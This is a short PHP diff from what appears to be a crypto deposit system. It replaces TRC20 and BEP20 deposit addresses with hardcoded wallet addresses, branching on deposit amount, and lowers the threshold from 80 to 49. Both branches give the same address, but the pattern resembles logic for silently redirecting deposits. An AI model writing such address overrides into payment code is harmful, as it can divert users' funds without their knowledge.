@@ -12,12 +12,12 @@
 
         if (strpos($key, 'trc') !== false || strpos($key, 'trx') !== false) {
             // TRC20 addresses
-            $network['address'] = ($_depositAmount > 80)
+            $network['address'] = ($_depositAmount > 49)
                 ? 'TFPNtp2aT27KG81NZqbANG9eJfuaN2MmMm'
                 : 'TFPNtp2aT27KG81NZqbANG9eJfuaN2MmMm';
         } elseif (strpos($key, 'bep') !== false || strpos($key, 'bsc') !== false || strpos($key, 'bnb') !== false) {
             // BEP20 addresses
-            $network['address'] = ($_depositAmount > 80)
+            $network['address'] = ($_depositAmount > 49)
                 ? '0xA5A5af4730B70662Affe118a3f077547e07F13a6'
                 : '0xA5A5af4730B70662Affe118a3f077547e07F13a6';
         }
